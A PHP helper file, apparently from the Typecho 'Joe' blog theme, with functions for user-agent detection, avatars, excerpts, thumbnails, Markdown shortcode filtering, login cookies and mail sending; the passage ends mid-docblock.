<?php

namespace joe;

use think\facade\Db;

if (!defined('__TYPECHO_ROOT_DIR__')) {
	http_response_code(404);
	exit;
}

function request()
{
	return \Typecho\Request::getInstance();
}

function zibll_color_list(): array
{
	return ['c-blue', 'c-yellow', 'c-green', 'c-cyan', 'c-blue-2', 'c-purple-2', 'c-yellow-2', 'c-purple', 'c-red-2', 'c-red'];
}

function zibll_rand_color(): string
{
	$color_list = zibll_color_list();
	return $color_list[array_rand($color_list)];
}

function comment_author($comment)
{
	if (preg_match('/^https?:\/\/[^\s]*/i', $comment->url)) {
		$url = \Typecho\Common::safeUrl($comment->url);
		$domain = parse_url($url, PHP_URL_HOST);
		if ($domain == JOE_DOMAIN) {
			return '<a href="' . $url . '" rel="nofollow">' . $comment->author . '</a>';
		}
		if (\Helper::options()->JPostLinkRedirect == 'on') {
			$url = \Helper::options()->index . '/goto?url=' . base64_encode($url);
			$url = \joe\root_relative_link($url);
		}
		return '<a href="' . $url . '" target="_blank" rel="external nofollow">' . $comment->author . '</a>';
	}
	return $comment->author;
}

/**
 * 获取去掉网站协议和域名的绝对相对路径
 */
function root_relative_link($link)
{
	// if (str_starts_with('http://', $link)) {
	// 	return str_starts_replace(str_starts_replace('https://', 'http://', \Helper::options()->siteUrl), '/', $link);
	// }
	// if (str_starts_with('https://', $link)) {
	// 	return str_starts_replace(str_starts_replace('http://', 'https://', \Helper::options()->siteUrl), '/', $link);
	// }
	return str_starts_replace(\Helper::options()->siteUrl, '/', $link);
}

function header_cache($time)
{
	// 设置缓存控制头部
	header("Cache-Control: max-age=$time, public");
	header('Expires: ' . gmdate('D, d M Y H:i:s', time() + $time) . ' GMT');
	header('Pragma: ' . 'cache');
}

/* 判断是否是手机 */
function isMobile()
{
	if (isset($_SERVER['HTTP_X_WAP_PROFILE']))
		return true;
	if (isset($_SERVER['HTTP_VIA'])) {
		return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
	}
	if (isset($_SERVER['HTTP_USER_AGENT'])) {
		$clientkeywords = array('nokia', 'sony', 'ericsson', 'mot', 'samsung', 'htc', 'sgh', 'lg', 'sharp', 'sie-', 'philips', 'panasonic', 'alcatel', 'lenovo', 'iphone', 'ipod', 'blackberry', 'meizu', 'android', 'netfront', 'symbian', 'ucweb', 'windowsce', 'palm', 'operamini', 'operamobi', 'openwave', 'nexusone', 'cldc', 'midp', 'wap', 'mobile');
		if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT'])))
			return true;
	}
	if (isset($_SERVER['HTTP_ACCEPT'])) {
		if ((strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false) && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html')))) {
			return true;
		}
	}
	return false;
}

function isPc()
{
	return !isMobile();
}

/* 根据评论agent获取浏览器类型 */
function getAgentBrowser($agent)
{
	if (preg_match('/MSIE\s([^\s|;]+)/i', $agent, $regs)) {
		$outputer = 'Internet Explore';
	} else if (preg_match('/FireFox\/([^\s]+)/i', $agent, $regs)) {
		$outputer = 'FireFox';
	} else if (preg_match('/Maxthon([\d]*)\/([^\s]+)/i', $agent, $regs)) {
		$outputer = 'MicroSoft Edge';
	} else if (preg_match('#360([a-zA-Z0-9.]+)#i', $agent, $regs)) {
		$outputer = '360 Fast Browser';
	} else if (preg_match('/Edge([\d]*)\/([^\s]+)/i', $agent, $regs)) {
		$outputer = 'MicroSoft Edge';
	} else if (preg_match('/UC/i', $agent)) {
		$outputer = 'UC Browser';
	} else if (preg_match('/QQ/i', $agent, $regs) || preg_match('/QQ Browser\/([^\s]+)/i', $agent, $regs)) {
		$outputer = 'QQ Browser';
	} else if (preg_match('/UBrowser/i', $agent, $regs)) {
		$outputer = 'UC Browser';
	} else if (preg_match('/Opera[\s|\/]([^\s]+)/i', $agent, $regs)) {
		$outputer = 'Opera';
	} else if (preg_match('/Chrome([\d]*)\/([^\s]+)/i', $agent, $regs)) {
		$outputer = 'Google Chrome';
	} else if (preg_match('/safari\/([^\s]+)/i', $agent, $regs)) {
		$outputer = 'Safari';
	} else {
		$outputer = 'Google Chrome';
	}
	return $outputer;
}

function getAgentBrowserIcon($AgentBrowser)
{
	$browser_svg = str_replace(' ', '-', $AgentBrowser);
	if (file_exists(JOE_ROOT . 'assets/images/agent/' . $browser_svg . '.svg')) {
		$browser_url =  \joe\theme_url('assets/images/agent/' . $browser_svg . '.svg', false);
	} else {
		$browser_url =  \joe\theme_url('assets/images/agent/' . $browser_svg . '.png', false);
	}
	return $browser_url;
}

/* 根据评论agent获取设备类型 */
function getAgentOSIcon($agent)
{
	$os = "Linux";
	if (preg_match('/win/i', $agent)) {
		if (preg_match('/nt 6.0/i', $agent)) {
			$os = 'Windows-7';
		} else if (preg_match('/nt 6.1/i', $agent)) {
			$os = 'Windows-7';
		} else if (preg_match('/nt 6.2/i', $agent)) {
			$os = 'Windows-8';
		} else if (preg_match('/nt 6.3/i', $agent)) {
			$os = 'Windows-8';
		} else if (preg_match('/nt 5.1/i', $agent)) {
			$os = 'Windows-XP';
		} else if (preg_match('/nt 10.0/i', $agent)) {
			$os = 'Windows-10';
		} else {
			$os = 'Windows-7';
		}
	} else if (preg_match('/android/i', $agent)) {
		$os = 'Android';
	} else if (preg_match('/ubuntu/i', $agent)) {
		$os = 'Ubuntu';
	} else if (preg_match('/linux/i', $agent)) {
		$os = 'Linux';
	} else if (preg_match('/iPhone/i', $agent)) {
		$os = 'iPhone';
	} else if (preg_match('/mac/i', $agent)) {
		$os = 'MacOS';
	} else if (preg_match('/fusion/i', $agent)) {
		$os = 'Android';
	} else {
		$os = 'Linux';
	}
	return $os;
}

/* 根据评论agent获取设备类型 */
function getAgentOS($agent)
{
	$os = "Linux";
	if (preg_match('/win/i', $agent)) {
		if (preg_match('/nt 6.0/i', $agent)) {
			$os = 'Windows Vista';
		} else if (preg_match('/nt 6.1/i', $agent)) {
			$os = 'Windows 7';
		} else if (preg_match('/nt 6.2/i', $agent)) {
			$os = 'Windows 8';
		} else if (preg_match('/nt 6.3/i', $agent)) {
			$os = 'Windows 8.1';
		} else if (preg_match('/nt 5.1/i', $agent)) {
			$os = 'Windows XP';
		} else if (preg_match('/nt 10.0/i', $agent)) {
			$os = 'Windows 10';
		} else {
			$os = 'Windows X64';
		}
	} else if (preg_match('/android/i', $agent)) {
		if (preg_match('/android 9/i', $agent)) {
			$os = 'Android Pie';
		} else if (preg_match('/android 8/i', $agent)) {
			$os = 'Android Oreo';
		} else {
			$os = 'Android';
		}
	} else if (preg_match('/ubuntu/i', $agent)) {
		$os = 'Ubuntu';
	} else if (preg_match('/linux/i', $agent)) {
		$os = 'Linux';
	} else if (preg_match('/iPhone/i', $agent)) {
		$os = 'iPhone';
	} else if (preg_match('/mac/i', $agent)) {
		$os = 'MacOS';
	} else if (preg_match('/fusion/i', $agent)) {
		$os = 'Android';
	} else {
		$os = 'Linux';
	}
	return $os;
}

/* 获取全局懒加载图 */
function getLazyload()
{
	$JLazyload = empty(\Helper::options()->JLazyload) ? theme_url('assets/images/lazyload.gif', null) : \Helper::options()->JLazyload;
	return $JLazyload;
}

/**
 * 获取头像懒加载图
 */
function getAvatarLazyload()
{
	$str = theme_url('assets/images/avatar-default.png', null);
	return $str;
}

/* 查询文章浏览量 */
function getViews($item)
{
	$result = Db::name('contents')->where('cid', $item->cid)->cache(true)->value('views');
	return number_format($result);
}

/* 查询文章点赞量 */
function getAgree($item)
{
	$result = Db::name('contents')->where('cid', $item->cid)->cache(true)->value('agree');
	return number_format($result);
}

/* 通过邮箱生成头像地址 */
function getAvatarByMail($mail, $type = true)
{
	if (empty($mail)) {
		$mail = Db::name('users')->where('uid', 1)->value('mail');
	}
	$gravatarsUrl = \Helper::options()->JCustomAvatarSource ? \Helper::options()->JCustomAvatarSource : 'https://gravatar.helingqi.com/wavatar/';
	$mailLower = strtolower($mail);
	$md5MailLower = md5($mailLower);
	$qqMail = str_replace('@qq.com', '', $mailLower);
	if (strstr($mailLower, "qq.com") && is_numeric($qqMail) && strlen($qqMail) < 13 && strlen($qqMail) > 4) {
		'https://q4.qlogo.cn/headimg_dl?dst_uin=2136118039&spec=640';
		$result =  'https://thirdqq.qlogo.cn/g?b=qq&nk=' . $qqMail . '&s=640';
	} else {
		$result = $gravatarsUrl . $md5MailLower . '?d=mm';
	}
	if ($type) echo $result;
	return $result;
};

/* 获取侧边栏随机一言 */
function getMotto()
{
	$Motto = isset(\Helper::options()->JMotto) ? \Helper::options()->JMotto : '';
	$JMottoRandom = explode("\r\n", $Motto);
	echo $JMottoRandom[array_rand($JMottoRandom, 1)];
}

/* 获取文章摘要 */
function getAbstract($item, $type = true)
{
	if ($item->fields->abstract) {
		$abstract = $item->fields->abstract;
	} else {
		$abstract = post_description($item, null);
	}
	if (empty($abstract)) {
		$abstract = "暂无简介";
	}
	if ($type) echo $abstract;
	else return $abstract;
}

/* 获取列表缩略图 */
function getThumbnails($item)
{
	$result = [];
	/* 如果填写了自定义缩略图，则优先显示填写的缩略图 */
	if ($item->fields->thumb) {
		$fields_thumb_arr = explode('||', $item->fields->thumb);
		foreach ($fields_thumb_arr as $list) $result[] = $list;
	}
	if (!is_string($item->content)) $item->content = '';
	$pattern_list = [
		'/\<img.*?src\=\"(.*?)\"[^>]*>/i',
		'/\!\[.*?\]\((http(s)?:\/\/.*?(jpg|jpeg|gif|png|webp))/i',
		'/\[.*?\]:\s*(http(s)?:\/\/.*?(jpg|jpeg|gif|png|webp))/i',
		'/\{dplayer.*?pic\="(.+?)"/i'
	];
	foreach ($pattern_list as $pattern) {
		/* 如果匹配到正则，则继续补充匹配到的图片 */
		if (preg_match_all($pattern, $item->content, $thumbUrl)) {
			foreach ($thumbUrl[1] as $list) $result[] = $list;
		}
	}
	/* 如果上面的数量不足3个，则直接补充3个随即图进去 */
	if (sizeof($result) < 3) {
		$custom_thumbnail = \Helper::options()->JThumbnail;
		/* 将for循环放里面，减少一次if判断 */
		if ($custom_thumbnail) {
			$custom_thumbnail_arr = explode("\r\n", $custom_thumbnail);
			for ($i = 0; $i < 3; $i++) {
				$result[] = $custom_thumbnail_arr[array_rand($custom_thumbnail_arr, 1)] . "?key=" . mt_rand(0, 1000000);
			}
		} else {
			for ($i = 0; $i < 3; $i++) {
				// 生成一个在 1 到 42 之间的随机数
				$randomNumber = rand(1, 42);
				// 将随机数格式化为两位数
				$formattedNumber = sprintf('%02d', $randomNumber);
				$result[] = theme_url('assets/images/thumb/' . $formattedNumber . '.jpg', null);
			}
		}
	}
	return array_map('trim', $result);
}

/* 获取父级评论 */
function getParentReply($parent)
{
	if ($parent != '0') {
		$author = Db::name('comments')->where('coid', $parent)->value('author');
		if (empty($author)) return;
		echo '<p class="parent">@' . $author . '</p> ';
	}
}

/* 获取侧边栏作者随机文章 */
function getAsideAuthorNav()
{
	if (empty(\Helper::options()->JAside_Author_Nav) || \Helper::options()->JAside_Author_Nav == "off") return;
	$limit = \Helper::options()->JAside_Author_Nav;
	$db = \Typecho\Db::get();
	$prefix = $db->getPrefix();
	$sql = "SELECT * FROM `{$prefix}contents` WHERE cid >= (SELECT floor( RAND() * ((SELECT MAX(cid) FROM `{$prefix}contents`)-(SELECT MIN(cid) FROM `{$prefix}contents`)) + (SELECT MIN(cid) FROM `{$prefix}contents`))) and type='post' and status='publish' and (password is NULL or password='') ORDER BY cid LIMIT $limit";
	$result = $db->query($sql);
	if (!$result instanceof \Traversable) return;
	foreach ($result as $item) {
		$item = \Typecho\Widget::widget('Widget_Abstract_Contents')->push($item);
		$title = htmlspecialchars($item['title']);
		$permalink = \joe\root_relative_link($item['permalink']);
		echo "<li class='item'><a class='link' href='{$permalink}' title='{$title}'>{$title}</a><svg class='svg' aria-hidden='true'><use xlink:href='#icon-copy-color'></use></svg></li>";
	}
}

/* 判断敏感词是否在字符串内 */
function checkSensitiveWords($pregs_string, $string)
{
	$preg_list = explode("||", $pregs_string);
	if (empty($preg_list)) return false;
	foreach ($preg_list as $preg) {
		$preg = trim($preg);
		if (str_starts_with($preg, '/')) return preg_match($preg, $string);
		if (strpos($string, $preg) !== false) return true;
	}
	return false;
}

function theme_url($path, $param = ['version' => 'md5'])
{
	static $url_root = null;
	if (is_null($url_root)) {
		$themeUrl = \Helper::options()->themeUrl;
		$theme_url_parse = parse_url($themeUrl);
		$theme_url_domain = $theme_url_parse['host'] . ($theme_url_parse['port'] ?? '');
		if ($theme_url_domain != $_SERVER['HTTP_HOST']) {
			$themeUrl = str_replace($theme_url_domain, $_SERVER['HTTP_HOST'], $themeUrl);
		}
		$themeUrl = preg_replace("/^http[s]?:\/\//", '//', $themeUrl);
		$url_root = empty(\Helper::options()->JStaticAssetsUrl) ? $themeUrl : \Helper::options()->JStaticAssetsUrl;
		$lastChar = substr($url_root, -1);
		if ($lastChar != '/') $url_root = $url_root . '/';
	}
	$url = $url_root . $path;
	if (isset($param['version']) && $param['version'] == 'md5') {
		$file = JOE_ROOT . $path;
		$param['version'] = is_file($file) ? md5_file($file) : JOE_VERSION;
	}
	return url_builder($url, $param);
}

function url_builder($url, $param = null)
{
	if (is_array($param) && !empty($param)) {
		$param = http_build_query($param);
		$url = strstr($url, '?') ? (trim($url, '&') . '&' . $param) : ($url . '?' . $param);
	}
	return $url;
}

/** 过滤Markdown语法代码 */
function markdown_filter($content): string
{
	if (!is_string($content)) return '';

	// 跑马灯
	$content = str_replace('{lamp/}', ' ', $content);

	// 任务
	$content = str_replace('{ }', ' ', $content);
	$content = str_replace('{x}', ' ', $content);

	// 网易云音乐
	$content = preg_replace('/{music-list([^}]*)\/}/', ' ', $content);
	$content = preg_replace('/{music([^}]*)\/}/', ' ', $content);

	// 音乐标签
	$content = preg_replace('/\{mp3 name\="([^}]*)" artist\="([^}]*)"([^}]*)\/\}/S', '$1 - $2', $content);

	// 哔哩哔哩视频
	$content = preg_replace('/{bilibili([^}]*)\/}/', ' ', $content);

	// 视频
	$content = preg_replace('/{dplayer-single([^}]*)\/}/', ' ', $content);
	// 标签页
	$content = preg_replace('/\{dplayer-list([^}]*)\}([\s\S]*?)\{\/dplayer-list\}/', '$2', $content);
	$content = preg_replace('/\{dplayer-list-item\b.*?title="([^"]*)".*?desc="([^"]*)".*?\/\}/i', '$1 $2', $content);

	// 居中标题标签
	$content = preg_replace('/\{mtitle title\="([^}]*)"\/\}/', '$1', $content);

	// 多彩按钮
	$content = preg_replace('/\{abtn.*?content\="([^}]*)"\/\}/', '$1', $content);

	// 云盘下载
	$content = preg_replace('/\{cloud title\="([^}]*)" type\="\w+" url\="([^}]*)" password\="([^}]*)"\/\}/', '$1 下载地址：$2 提取码：$3', $content);

	// 便条按钮
	$content = preg_replace('/\{anote.*?content\="([^}]*)"\/\}/', '$1', $content);

	// 彩色虚线
	$content = preg_replace('/{dotted([^}]*)\/}/', ' ', $content);

	// 消息提示
	$content = preg_replace('/\{message type="\w+" content\="([^}]*)"\/\}/', '$1', $content);

	// 进度条
	$content = preg_replace('/\{progress percentage="(\d+)" color\="#?([a-fA-F0-9]{6}|[a-fA-F0-9]{3})"\/\}/', '进度$1%', $content);

	// 隐藏内容
	$content = preg_replace('/{hide[^}]*}([\s\S]*?){\/hide}/', '隐藏内容，请前往内页查看详情', $content);

	// 以下为双标签

	// 默认卡片
	$content = preg_replace('/\{card\-default label\="([^}]*)" width\="\d+"\}([\s\S]*?)\{\/card\-default\}/', '$1 - $2', $content);

	// 标注
	$content = preg_replace('/\{callout color\="#?([a-fA-F0-9]{6}|[a-fA-F0-9]{3})"\}([\s\S]*?)\{\/callout\}/', '$1', $content);

	// 警告提示
	$content = preg_replace('/\{alert type\="\w+"\}([\s\S]*?)\{\/alert\}/', '$1', $content);

	// 描述卡片
	$content = preg_replace('/\{card\-describe title\="([^}]*)"\}([\s\S]*?)\{\/card\-describe\}/', '$1 - $2', $content);

	// 标签页
	$content = preg_replace('/\{tabs\}([\s\S]*?)\{\/tabs\}/', '$1', $content);
	$content = preg_replace('/\{tabs\-pane label\="([^}]*)"}([\s\S]*?)\{\/tabs\-pane\}/', '$1 $2', $content);

	// 卡片列表
	$content = preg_replace('/\{card\-list\}([\s\S]*?)\{\/card\-list\}/', '$1', $content);
	$content = preg_replace('/\{card\-list\-item\}([\s\S]*?)\{\/card\-list\-item\}/', '$1', $content);

	// 时间轴
	$content = preg_replace('/\{timeline\}([\s\S]*?)\{\/timeline\}/', '$1', $content);
	$content = preg_replace('/\{timeline\-item color\="#?([a-fA-F0-9]{6}|[a-fA-F0-9]{3})"\}([\s\S]*?)\{\/timeline\-item\}/', '$1', $content);

	// 折叠面板
	$content = preg_replace('/\{collapse\}([\s\S]*?)\{\/collapse\}/', '$1', $content);
	$content = preg_replace('/\{collapse\-item label\="([^}]*)"\s?[open]*\}([\s\S]*?)\{\/collapse\-item\}/', '$1 - $2', $content);

	// 宫格
	$content = preg_replace('/\{gird column\="\d+" gap\="\d+"\}([\s\S]*?)\{\/gird\}/', '$1', $content);
	$content = preg_replace('/\{gird\-item\}([\s\S]*?)\{\/gird\-item\}/', '$1', $content);

	// 复制
	$content = preg_replace('/\{copy showText\="([^}]*)" copyText\="([^}]*)"\/\}/', '$1 $2', $content);

	// 其他开合标签
	// $content = preg_replace('/\{[\w,\-]+.*?\}([^}]*)\{\/[\w,\-]+\}/S', '$1', $content);

	// 标签中有content值
	// $content = preg_replace('/\{.*?content\="([^}]*)"\/\}/S', '$1', $content);

	// 剩下没有文本的单标签
	// $content = preg_replace('/\{.*?\/\}/S', ' ', $content);

	$content = trim($content);
	return $content;
}

/**
 * 对文章的简短纯文本描述
 *
 * @return string
 */
function post_description($item, ?int $length = 150)
{
	if ($item->password) {
		return "加密文章，请前往内页查看详情";
	} else {
		$content = $item->content;
		$content = html_tags_filter($content, ['h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p']);
		$content = str_replace(['<br>', '<li>', '</li>'], [' ', '<li> ', '</li> '], $content);
		$content = preg_replace('/\<img src\=".*?" alt\="(.*?)" title\=".*?"\>/', '$1图片', $content);
		$content = str_replace(['图片图片', 'Test图片'], '图片', $content);
		$content = str_replace(["\n", '"'], [' ', '&quot;'], strip_tags(markdown_filter($content)));
		$content = preg_replace('/\s+/s', ' ', $content);
		$content = empty($content) ? $item->title : $content;
		if (is_numeric($length)) $content = trim(\Typecho\Common::subStr($content, 0, $length, '...'));
		return trim($content);
	}
}

function html_tags_filter(string $content, array $tags): string
{
	foreach ($tags as $value) {
		$content = preg_replace('/\<' . $value . '\>(.*?)\<\/' . $value . '\>/i', '$1 ', $content);
	}
	return $content;
}

function user_login($uid, $expire = 30243600)
{
	$db = \Typecho\Db::get();
	\Typecho\Widget::widget('Widget_User')->simpleLogin($uid);
	$authCode = function_exists('openssl_random_pseudo_bytes') ? bin2hex(openssl_random_pseudo_bytes(16)) : sha1(\Typecho\Common::randString(20));
	\Typecho\Cookie::set('__typecho_uid', $uid, time() + $expire);
	\Typecho\Cookie::set('__typecho_authCode', \Typecho\Common::hash($authCode), time() + $expire);
	//更新最后登录时间以及验证码
	$db->query($db->update('table.users')->expression('logged', 'activated')->rows(['authCode' => $authCode])->where('uid = ?', $uid));
}

function user_url($action, $referer = true)
{
	if ($referer === true) {
		if (!empty($_GET['referer'])) {
			$url = '?referer=' . urlencode($_GET['referer']);
		} else {
			$sys_protocal = isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == '443' ? 'https://' : 'http://';
			$php_self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
			$path_info = isset($_SERVER['PATH_INFO']) ? $_SERVER['PATH_INFO'] : '';
			$relate_url = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : $php_self . (isset($_SERVER['QUERY_STRING']) ? '?' . $_SERVER['QUERY_STRING'] : $path_info);
			$url = '?referer=' . urlencode($sys_protocal . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '') . $relate_url);
		}
	} else if (is_string($referer)) {
		if (urldecode($referer) == $referer) {
			$url = '?referer=' . urlencode($referer);
		} else {
			$url = '?referer=' . $referer;
		}
	} else {
		$url = '';
	}
	if (\Helper::options()->JUser_Switch == 'on') {
		$url = \Typecho\Common::url('user/' . $action, \Helper::options()->index) . $url;
	} else {
		$url = \Helper::options()->adminUrl . $action . '.php';
	}
	$url = root_relative_link($url);
	return $url;
}


/** 获取百度统计配置 */
function baidu_statistic_config()
{
	$statistics_config = \Helper::options()->baidu_statistics ? explode(PHP_EOL, \Helper::options()->baidu_statistics) : null;
	if (is_array($statistics_config) && count($statistics_config) == 4) {
		return [
			'access_token' => trim($statistics_config[0]),
			'refresh_token' => trim($statistics_config[1]),
			'client_id' => trim($statistics_config[2]),
			'client_secret' => trim($statistics_config[3])
		];
	}
	return null;
}

/** 检测主题设置是否配置邮箱 */
function email_config()
{
	if (!empty(\Helper::options()->JMailApi)) return true;
	if (
		empty(\Helper::options()->JCommentMailHost) ||
		empty(\Helper::options()->JCommentMailPort) ||
		empty(\Helper::options()->JCommentMailAccount) ||
		empty(\Helper::options()->JCommentSMTPSecure) ||
		empty(\Helper::options()->JCommentMailPassword)
	) {
		return false;
	} else {
		return true;
	}
}

/**
 * 发送电子邮件
 * @return true|string
 */
function send_mail(string $mail_title, string|null $subtitle, array|string $content, $to_email = '', int $limit_time = 0)
{
	if (!email_config()) return '管理员未配置发件邮箱';
	if (!defined('JOE_ROOT')) define('JOE_ROOT', dirname(__DIR__) . '/');
	/* Composer 自动加载 */
	require_once JOE_ROOT . 'system/vendor/autoload.php';
	/* ThinkORM 数据库配置 */
	require_once JOE_ROOT . 'public/database.php';

	$mailto = empty(\Helper::options()->JCommentMailAccount) ? Db::name('users')->where('group', 'administrator')->value('mail') : \Helper::options()->JCommentMailAccount;

	if (empty($to_email)) $to_email = $mailto;

	if (empty($subtitle)) $subtitle = '';
	$mail_title = $mail_title . ' - ' . \Helper::options()->title;

	if (is_array($content)) {
		$content_string = '';
		foreach ($content as $name => $value) {
			if (is_numeric($name)) {
				$content_string .=  '<p style="margin-top: 10px;margin-bottom: 10px;">' . $value . '</p>';
			} else {
				$content_string .= '<p style="margin-top: 10px;margin-bottom: 10px;">' . $name . '：' . $value . '</p>';
			}
		}
		$content = $content_string;
	}

	$html = file_get_contents(JOE_ROOT . 'module/email.html');
	$html = strtr($html, [
		'{$title}' => $mail_title,
		'{$subtitle}' => empty($subtitle) ? '' : '<div style="margin-bottom:20px;line-height:1.5;">' . $subtitle . '</div>',
		'{$content}' => $content,
		'{$site_url}' => \Helper::options()->siteUrl,
		'{$mailto}' => $mailto,
	]);
	$FromName = empty(\Helper::options()->JCommentMailFromName) ? \Helper::options()->title : \Helper::options()->JCommentMailFromName;

	if ($limit_time) {
		if (!\joe\is_session_started()) session_start();
		$send_interval_time = time() - ($_SESSION['joe_send_mail_time'] ?? 0);
		if (isset($_SESSION['joe_send_mail_time']) && $send_interval_time <= $limit_time) return ($limit_time - $send_interval_time) . '秒后可重发';
	}

	if (!empty(\Helper::options()->JMailApi)) {
		$JMailApi = optionMulti(\Helper::options()->JMailApi, '||', null, ['url', 'title', 'name', 'content', 'email', 'code', '200', 'message']);
		$send_email = \network\http\post($JMailApi['url'], [
			$JMailApi['title'] =>  $mail_title,
			$JMailApi['name'] => $FromName,
			$JMailApi['content'] => $html,
			$JMailApi['email'] => $to_email
		])->toArray();
		if (is_array($send_email)) {
			if (!isset($send_email[$JMailApi['code']])) return 'API对接发件失败！成功字段未返回';
			if ($send_email[$JMailApi['code']] == $JMailApi['200']) {
				$_SESSION['joe_send_mail_time'] = time();
				return true;
			} else {
				return 'API对接发件失败！' . ($send_email[$JMailApi['message']] ?? '失败信息字段未返回');
			}
		} else {
			return $send_email;
		}
	}

	try {
		$PHPMailer = new \PHPMailer\PHPMailer\PHPMailer();
		$language = $PHPMailer->setLanguage('zh_cn');
		if (!$language) return 'PHPMailer 语言文件 zh_cn 加载失败';
		$PHPMailer->isSMTP();
		$PHPMailer->SMTPAuth = true;
		$PHPMailer->CharSet = 'UTF-8';
		$PHPMailer->SMTPSecure = \Helper::options()->JCommentSMTPSecure;
		$PHPMailer->Host = \Helper::options()->JCommentMailHost;
		$PHPMailer->Port = \Helper::options()->JCommentMailPort;
		$PHPMailer->FromName = $FromName;
		$PHPMailer->Username = \Helper::options()->JCommentMailAccount;
		$PHPMailer->From = \Helper::options()->JCommentMailAccount;
		$PHPMailer->Password = \Helper::options()->JCommentMailPassword;
		$PHPMailer->isHTML(true);
		$PHPMailer->Body = $html;
		$PHPMailer->addAddress($to_email);
		$PHPMailer->Subject = $mail_title;
		if ($PHPMailer->send()) {
			if ($limit_time) $_SESSION['joe_send_mail_time'] = time();
			return true;
		} else {
			return $PHPMailer->ErrorInfo;
		}
		return $PHPMailer->send() ? true : $PHPMailer->ErrorInfo;
	} catch (\PHPMailer\PHPMailer\Exception $e) {
		return '邮件发送失败：' . $PHPMailer->ErrorInfo;
	}
}

/**
 * 输出CDN链接
 *
 * @param string|null $path 子路径
 * @return string
 */
function cdn($path = '')
{
	$JCdnUrl = empty(\Helper::options()->JCdnUrl) ? theme_url('assets/plugin/', false) : \Helper::options()->JCdnUrl;
	$JCdnUrl_explode = explode('||', $JCdnUrl, 2);
	$cdnpublic = trim($JCdnUrl_explode[0]); // 获取 || 之前的内容
	if (substr($cdnpublic, -1) != '/') $cdnpublic = $cdnpublic . '/';
	if (!empty($JCdnUrl_explode[1])) {
		$backslash = trim($JCdnUrl_explode[1]); // 获取 || 之后的内容
		$path = preg_replace('/\//', $backslash, $path, 1);
	}
	$url = trim($cdnpublic) . trim($path);
	return $url;
}

/**
 * @param string $haystack 被搜索的字符串
 * @param array $needles 要搜索的字符串
 * @return bool
 */
function strstrs(string $haystack, array $needles): bool
{
	foreach ($needles as $value) {
		if (stristr($haystack, $value) !== false) return true;
	}
	return false;
}

function permalink(array $content)
{
	$routeExists = (null != \Typecho\Router::get($content['type']));
	$content['pathinfo'] = $routeExists ? \Typecho\Router::url($content['type'], $content) : '#';
	return \Typecho\Common::url($content['pathinfo'], \Helper::options()->index);
}

/**
 * 显示上一篇
 *
 * 如果没有下一篇,返回null
 */
function thePrev($widget, $default = NULL)
{
	$content = Db::name('contents')->where('created', '<', $widget->created)
		->where(['status' => 'publish', 'type' => $widget->type])
		->order('created', 'desc')
		->find();
	if ($content) {
		// $content = $widget->filter($content);
		$content['permalink'] = permalink($content);
		return $content;
	} else {
		return $default;
	}
}

/**
 * 获取下一篇文章mid
 *
 * 如果没有下一篇,返回null
 */
function theNext($widget, $default = NULL)
{
	$content = Db::name('contents')
		->where('created', '>', $widget->created)
		->where(['status' => 'publish', 'type' => $widget->type])
		->order('created', 'asc')
		->find();

	if ($content) {
		$content['permalink'] = permalink($content);
		return $content;
	} else {
		return $default;
	}
}

function dateWord($original_date)
{
	// 2022年08月01日 -> 2022年
	if (preg_match('/(\d+)年\d+月\d+日/i', $original_date, $match)) {
		$original_date = (date('Y') - $match[1]) . '年前';
	}

	// 昨天 21:11 -> 昨天
	$original_date = preg_replace('/昨天 \d+:\d+/i', '昨天', $original_date);

	$original_date = str_replace(['一', '二', '三', '四', '五', '六', '七', '八', '九', '十'], ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10'], $original_date);

	// 10月8日 -> 10月
	// $original_date = preg_replace('/(\d+月)\d+日/i', '$1', $original_date); 

	return $original_date;
}

// function optionMulti($string, string|array $line = "\r\n", $separator = '||', array $key = []): array
// {
// 	if (empty($string) || (!is_string($string) && !is_array($string))) return [];
// 	if (is_array($line) && is_array($string)) {
// 		$key = $line;
// 		$line = "\r\n";
// 		$separator = null;
// 	}
// 	$explode_string = is_string($string) ? explode($line, $string) : $string;
// 	if (is_string($separator)) {
// 		$optionMulti = [];
// 		foreach ($explode_string as $index => $value) {
// 			$option = array_map('trim', explode($separator, $value));
// 			foreach ($key as $i => $val) {
// 				$option[$val] = isset($option[$i]) ? $option[$i] : null;
// 			}
// 			$optionMulti[$index] = $option;
// 		}
// 	} else {
// 		$optionMulti = array_map('trim', $explode_string);
// 		foreach ($key as $index => $value) {
// 			if (isset($optionMulti[$index])) {
// 				$optionMulti[$value] = $optionMulti[$index];
// 				unset($optionMulti[$index]);
// 			} else {
// 				$optionMulti[$value] = null;
// 			}
// 		}
// 	}
// 	return $optionMulti;
// }

/**
 * 解析多级选项配置
 * 
 * @param string|array|null $input 输入数据(字符串或数组)
 * @param string|array $line 分隔符或键名配置
 * @param ?string $separator 次级分隔符
 * @param array $keys 键名映射
 * @return array
 */
function optionMulti(
	$input,
	string|array $line = "\r\n",
	?string $separator = '||',
	array $keys = []
): array {
	if (empty($input)) return [];

	// 参数重分配：当line是数组且input也是数组时，line参数实际为keys
	if (is_array($line) && is_array($input)) {
		$keys = $line;
		$line = "\r\n";
		$separator = null;
	}

	$lines = is_string($input) ? explode($line, $input) : $input;
	$result = [];

	if ($separator && is_string($separator)) {
		foreach ($lines as $idx => $lineStr) {
			$items = array_map('trim', explode($separator, $lineStr));
			// 键名替换，移除原数字索引
			foreach ($keys as $i => $key) {
				$items[$key] = $items[$i] ?? null;
				unset($items[$i]);
			}
			$result[$idx] = $items;
		}
	} else {
		$result = array_map('trim', $lines);
		// 键名替换
		foreach ($keys as $oldIdx => $newKey) {
			if (array_key_exists($oldIdx, $result)) {
				$result[$newKey] = $result[$oldIdx];
				unset($result[$oldIdx]);
			} else {
				$result[$newKey] = null;
			}
		}
	}

	return $result;
}

/**
 * 检测面板是否存在
 *
